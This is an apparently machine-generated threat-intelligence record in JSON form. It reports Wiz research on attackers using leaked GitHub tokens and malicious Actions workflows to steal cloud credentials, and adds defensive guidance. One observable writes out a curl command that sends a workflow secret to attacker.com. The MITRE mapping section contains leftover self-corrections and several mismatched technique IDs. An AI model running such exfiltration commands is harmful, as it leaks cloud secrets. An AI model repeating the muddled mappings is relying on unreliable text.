{
  "id": "adf8fca4-ad51-4534-b7c7-5dc0b8d1017a",
  "slug": "code-to-cloud-attack-vector-abuses-github-pats",
  "headline": "Code-to-Cloud Attacks: Leaked GitHub Tokens Become Keys to the Kingdom",
  "title": "New \"Code-to-Cloud\" Attack Vector Sees Threat Actors Pivot From GitHub to Cloud Environments via Leaked PATs",
  "summary": "Security researchers at Wiz have detailed an emerging \"code-to-cloud\" attack vector where threat actors leverage compromised GitHub Personal Access Tokens (PATs) to pivot from code repositories directly into production cloud environments. By abusing the trust between GitHub and connected Cloud Service Providers (CSPs), attackers with even basic read permissions can discover secret names, then use write permissions to execute malicious GitHub Actions that exfiltrate CSP credentials. The attack is particularly stealthy as API calls to search for secret names are not logged by GitHub Enterprise, creating a major visibility gap for defenders.",
  "full_report": "## Executive Summary\nSecurity researchers at the **[Wiz](https://www.wiz.io)** Customer Incident Response Team (CIRT) have identified a sophisticated attack path they call \"code-to-cloud,\" which allows threat actors to pivot from a compromised code repository into a production cloud environment. This attack leverages leaked or compromised **[GitHub](https://github.com/)** Personal Access Tokens (PATs). Even a PAT with basic read-only permissions can be used to discover the names of GitHub Action Secrets, which often contain high-value credentials for Cloud Service Providers (CSPs). If the attacker obtains a PAT with write access, they can modify CI/CD workflows to exfiltrate these secrets and gain direct access to the victim's cloud infrastructure. This creates a stealthy and highly impactful attack vector that bypasses traditional network perimeter defenses.\n\n---\n\n## Threat Overview\nThe attack capitalizes on the tight integration between modern development platforms like GitHub and cloud environments (e.g., AWS, Azure, GCP). The core of the threat lies in the misuse of GitHub PATs, which are often over-provisioned and poorly monitored.\n\nThe attack flow proceeds as follows:\n1.  **Compromise PAT**: An attacker obtains a GitHub PAT, either through public leaks, social engineering, or malware.\n2.  **Discover Secrets**: Using the PAT, the attacker queries the GitHub API to list the names of all GitHub Action Secrets within the repository. Critically, Wiz researchers found that these API search calls are **not logged** in GitHub Enterprise, making this reconnaissance phase invisible.\n3.  **Exfiltrate Secrets**: If the PAT has `workflow` write permissions, the attacker modifies an existing GitHub Actions workflow file or creates a new one. This malicious workflow is configured to access the discovered secrets and exfiltrate their values to an attacker-controlled server.\n4.  **Pivot to Cloud**: With the exfiltrated CSP credentials (e.g., AWS access keys, Azure service principal credentials), the attacker now has direct access to the victim's cloud environment.\n5.  **Cover Tracks**: The attacker can use the same PAT to delete the malicious workflow file or revert changes to hide their activity.\n\nThis threat is exacerbated by poor security hygiene. Wiz data shows that 73% of organizations store CSP credentials in GitHub Action Secrets, and 45% have plain-text cloud keys in private code repositories.\n\n## Technical Analysis\nThis attack chain leverages several MITRE ATT&CK techniques:\n- **Credential Access**: [`T1552.006 - Unsecured Credentials: GitHub Personal Access Tokens`](https://attack.mitre.org/techniques/T1552/006/). This is the entry point of the attack.\n- **Discovery**: [`T1598.003 - Spearphishing Link`](https://attack.mitre.org/techniques/T1598/003/) is not correct. It should be related to discovering cloud secrets. A better fit is [`T1552 - Unsecured Credentials`](https://attack.mitre.org/techniques/T1552/) as a general category, or a more specific discovery technique like [`T1087 - Account Discovery`](https://attack.mitre.org/techniques/T1087/). The core action is discovering the *existence* of secrets.\n- **Execution**: [`T1059.006 - Python`](https://attack.mitre.org/techniques/T1059/006/) or [`T1059.004 - Unix Shell`](https://attack.mitre.org/techniques/T1059/004/) within a malicious GitHub Actions workflow.\n- **Collection**: [`T1530 - Data from Cloud Storage Object`](https://attack.mitre.org/techniques/T1530/) is not quite right. The action is collecting the secrets themselves. [`T1552.005 - Cloud Credentials`](https://attack.mitre.org/techniques/T1552/005/) is more appropriate as the goal.\n- **Defense Evasion**: [`T1562.007 - Disable or Modify Cloud Firewall`](https://attack.mitre.org/techniques/T1562/007/) is not correct. A better fit is [`T1070.005 - Network Share Connection Removal`](https://attack.mitre.org/techniques/T1070/005/) or more generally [`T1564 - Hide Artifacts`](https://attack.mitre.org/techniques/T1564) by deleting workflow logs/files.\n\nLet's refine the TTPs:\n- **Credential Access**: [`T1552.006 - Unsecured Credentials: GitHub Personal Access Tokens`](https://attack.mitre.org/techniques/T1552/006/)\n- **Execution**: [`T1059 - Command and Scripting Interpreter`](https://attack.mitre.org/techniques/T1059/) via CI/CD pipeline modification.\n- **Collection**: [`T1552.005 - Cloud Credentials`](https://attack.mitre.org/techniques/T1552/005/)\n- **Lateral Movement**: The pivot from GitHub to the cloud environment itself constitutes lateral movement between distinct platforms.\n\n## Impact Assessment\nA successful code-to-cloud attack can be catastrophic, as it bridges the gap between development and production environments. Potential impacts include:\n- **Full Cloud Environment Compromise**: Attackers can gain administrative access to the cloud environment, allowing them to steal data, deploy ransomware on cloud assets, or disrupt services.\n- **Massive Data Exfiltration**: Access to production databases and storage buckets can lead to the theft of enormous volumes of sensitive company and customer data.\n- **Supply Chain Attack**: Attackers could use their access to inject malicious code into the application, which is then deployed to customers.\n- **Cryptojacking**: Attackers can spin up powerful cloud resources to mine cryptocurrency at the victim's expense.\n\n## Cyber Observables for Detection\n| Type | Value | Description |\n|---|---|---|\n| `log_source` | GitHub Audit Logs | Monitor for PATs being created with overly broad permissions or PATs that have not been used recently becoming active. |\n| `api_endpoint` | `GET /repos/{owner}/{repo}/actions/secrets` | While the search call itself may not be logged, monitor for any available API logs showing access to list secrets. |\n| `log_source` | GitHub Actions workflow logs | Look for workflows that are unexpectedly modified, or new workflows that contain commands like `curl`, `wget`, or network connections to unknown IPs. |\n| `log_source` | CloudTrail / Azure Activity Logs | Correlate GitHub activity with cloud activity. Alert on cloud API calls made from unexpected sources shortly after a CI/CD run. |\n\n## Detection & Response\n- **GitHub Audit Log Monitoring**: Regularly review GitHub audit logs for suspicious PAT activity. Look for PATs created without expiry dates, PATs with excessive permissions (`repo`, `workflow`), and PATs being used from anomalous IP addresses or geographic locations. This is an application of D3FEND's [`D3-UGLPA: User Geolocation Logon Pattern Analysis`](https://d3fend.mitre.org/technique/d3f:UserGeolocationLogonPatternAnalysis).\n- **CI/CD Pipeline Monitoring**: Implement monitoring for your `workflows` directory in GitHub. Alert on any commit that modifies a workflow file, especially those that add new steps involving shell commands or network requests. This is a form of [`D3-SFA: System File Analysis`](https://d3fend.mitre.org/technique/d3f:SystemFileAnalysis).\n- **Cloud Threat Detection**: Use a Cloud Security Posture Management (CSPM) or Cloud-Native Application Protection Platform (CNAPP) tool to detect anomalous behavior in your cloud environment. Correlate alerts with recent GitHub Actions runs. For example, an alert for a new IAM user being created by credentials that are only used in CI/CD is a major red flag.\n\n## Mitigation\n1.  **Adopt OIDC for Cloud Authentication**: The most effective mitigation is to stop using long-lived static credentials (like AWS access keys) in GitHub Actions. Instead, use OpenID Connect (OIDC) to establish a trust relationship between GitHub and your CSP. This allows workflows to request short-lived, ephemeral credentials directly from the CSP for each job, eliminating the need to store secrets in GitHub. This is a form of [`D3-ANCI: Authentication Cache Invalidation`](https://d3fend.mitre.org/technique/d3f:AuthenticationCacheInvalidation).\n2.  **Enforce PAT Best Practices**: If PATs must be used, enforce strict policies:\n    - **Expiration**: Mandate that all PATs have a short expiration date (e.g., 30 days).\n    - **Least Privilege**: Ensure PATs are scoped with the minimum required permissions. A PAT that only needs to read code should not have `workflow` or `write` permissions.\n    - **Fine-Grained PATs**: Use fine-grained PATs that can be restricted to specific repositories.\n3.  **Secret Scanning**: Implement automated secret scanning in your pre-commit hooks and CI/CD pipelines to prevent any hard-coded credentials from ever entering the codebase.\n4.  **Workflow Hardening**: Use GitHub features like environment protection rules to require manual approval for workflows that access sensitive environments or secrets.",
  "twitter_post": "New 'Code-to-Cloud' attack vector detailed by @wiz_io. ☁️ Attackers pivot from GitHub to cloud environments using leaked Personal Access Tokens (PATs) to steal CSP credentials from Actions secrets. Time to adopt OIDC! #DevSecOps #GitHub #CloudSecurity",
  "meta_description": "Discover the 'code-to-cloud' attack vector where threat actors use compromised GitHub Personal Access Tokens (PATs) to pivot into production cloud environments, exfiltrating secrets and gaining control.",
  "category": [
    "Cloud Security",
    "Supply Chain Attack",
    "Vulnerability"
  ],
  "severity": "high",
  "entities": [
    {
      "name": "Wiz",
      "type": "vendor",
      "url": "https://www.wiz.io/"
    },
    {
      "name": "GitHub",
      "type": "product",
      "url": "https://github.com/"
    },
    {
      "name": "GitHub Personal Access Tokens (PATs)",
      "type": "technology"
    },
    {
      "name": "GitHub Actions",
      "type": "technology"
    },
    {
      "name": "Cloud Service Provider (CSP)",
      "type": "other"
    },
    {
      "name": "GitHub Enterprise",
      "type": "product"
    }
  ],
  "cves": [],
  "sources": [
    {
      "url": "https://www.wiz.io/blog/code-to-cloud-attacks-github-pat-to-cloud-control-plane",
      "title": "Code to Cloud Attacks: From Github PAT to Cloud Control Plane",
      "date": "2025-12-09",
      "friendly_name": "Wiz",
      "website": "wiz.io"
    },
    {
      "url": "https://www.wiz.io/resource/state-of-code-security-2025",
      "title": "State of Code Security in 2025 | Wiz",
      "date": "2025-12-09",
      "friendly_name": "Wiz",
      "website": "wiz.io"
    }
  ],
  "events": [],
  "mitre_techniques": [
    {
      "id": "T1552.006",
      "name": "Unsecured Credentials: GitHub Personal Access Tokens"
    },
    {
      "id": "T1059",
      "name": "Command and Scripting Interpreter",
      "tactic": "Execution"
    },
    {
      "id": "T1552.005",
      "name": "Cloud Credentials",
      "tactic": "Credential Access"
    },
    {
      "id": "T1564",
      "name": "Hide Artifacts",
      "tactic": "Defense Evasion"
    }
  ],
  "mitre_mitigations": [
    {
      "id": "M1032",
      "name": "Multi-factor Authentication",
      "d3fend_techniques": [
        {
          "id": "D3-MFA",
          "name": "Multi-factor Authentication",
          "url": "https://d3fend.mitre.org/technique/d3f:Multi-factorAuthentication"
        }
      ],
      "description": "While not directly protecting PATs, enforcing MFA on GitHub user accounts makes the initial compromise needed to create a PAT much harder.",
      "domain": "enterprise"
    },
    {
      "id": "M1015",
      "name": "Active Directory Configuration",
      "d3fend_techniques": [
        {
          "id": "D3-ANCI",
          "name": "Authentication Cache Invalidation",
          "url": "https://d3fend.mitre.org/technique/d3f:AuthenticationCacheInvalidation"
        }
      ],
      "description": "This is a proxy for identity management. The best mitigation is using OIDC for ephemeral, short-lived credentials instead of static PATs.",
      "domain": "enterprise"
    },
    {
      "id": "M1047",
      "name": "Audit",
      "d3fend_techniques": [
        {
          "id": "D3-DAM",
          "name": "Domain Account Monitoring",
          "url": "https://d3fend.mitre.org/technique/d3f:DomainAccountMonitoring"
        }
      ],
      "description": "Regularly audit GitHub logs for PAT creation, usage from anomalous locations, and modifications to workflow files.",
      "domain": "enterprise"
    }
  ],
  "d3fend_countermeasures": [
    {
      "technique_id": "D3-ANCI",
      "technique_name": "Authentication Cache Invalidation",
      "url": "https://d3fend.mitre.org/technique/d3f:AuthenticationCacheInvalidation",
      "recommendation": "The most effective defense against this 'code-to-cloud' attack is to eliminate the use of long-lived static credentials like GitHub PATs for cloud access. Implement OpenID Connect (OIDC) between your GitHub repository and your Cloud Service Provider (e.g., AWS, Azure, GCP). Configure a trust relationship that allows GitHub Actions workflows to assume a specific IAM role. This role will then grant short-lived, ephemeral credentials that are valid only for the duration of that specific workflow job. This approach ensures that even if an attacker compromises your repository, there are no persistent cloud credentials to steal. It completely removes the standing privilege that PATs with embedded CSP keys represent, directly mitigating the core threat of secret exfiltration.",
      "mitre_mitigation_id": "M1015"
    },
    {
      "technique_id": "D3-RAPA",
      "technique_name": "Resource Access Pattern Analysis",
      "url": "https://d3fend.mitre.org/technique/d3f:ResourceAccessPatternAnalysis",
      "recommendation": "For environments where PATs are still in use, implement robust monitoring of their activity. Ingest GitHub audit logs into your SIEM and establish a baseline of normal PAT usage. Create alerts for anomalous patterns, such as: 1) A PAT that has been dormant for a long period suddenly becomes active. 2) A PAT is used from a new or suspicious IP address or ASN. 3) A PAT associated with one repository is used to try and access another. 4) A PAT is used to modify a `.github/workflows/` file outside of a pull request process. By analyzing access patterns, you can detect when a legitimate PAT has been compromised and is being used for malicious reconnaissance or to tamper with CI/CD pipelines.",
      "mitre_mitigation_id": "M1040"
    }
  ],
  "iocs": [],
  "cyber_observables": [
    {
      "type": "other",
      "value": "GitHub PAT usage from non-corporate IP space.",
      "description": "A personal access token being used from an IP address outside of your organization's known ranges is a strong indicator of compromise.",
      "context": "GitHub Audit Logs, SIEM correlation with IP reputation feeds.",
      "confidence": "high"
    },
    {
      "type": "command_line_pattern",
      "value": "echo ${{ secrets.YOUR_SECRET }} | curl -d @- https://attacker.com",
      "description": "A common pattern in a malicious GitHub Actions workflow to exfiltrate a secret's value.",
      "context": "Reviewing .github/workflows/ files for suspicious commands.",
      "confidence": "high"
    },
    {
      "type": "api_endpoint",
      "value": "GET /repos/{owner}/{repo}/actions/secrets",
      "description": "API call to list the names of secrets in a repository. While not logged by default, if logs are available, this is a key reconnaissance step.",
      "context": "GitHub API logs (if available), proxy logs.",
      "confidence": "medium"
    },
    {
      "type": "other",
      "value": "Creation of new workflow files by users who are not developers.",
      "description": "A non-technical user or a PAT associated with one committing a new workflow file is highly suspicious.",
      "context": "GitHub Audit Logs, Git repository monitoring.",
      "confidence": "high"
    }
  ],
  "tags": [
    "DevSecOps",
    "GitHub",
    "Cloud Security",
    "CI/CD",
    "Personal Access Token",
    "PAT",
    "Supply Chain"
  ],
  "extract_datetime": "2025-12-09T15:00:00.000Z",
  "article_type": "Analysis",
  "impact_scope": {
    "geographic_scope": "global",
    "industries_affected": [
      "Technology",
      "Finance",
      "Healthcare",
      "Other"
    ],
    "other_affected": [
      "Organizations utilizing CI/CD pipelines with integrated cloud environments"
    ]
  },
  "pub_date": "2025-12-09",
  "reading_time_minutes": 6,
  "createdAt": "2025-12-09T15:00:00.000Z",
  "updatedAt": "2025-12-09T15:00:00.000Z"
}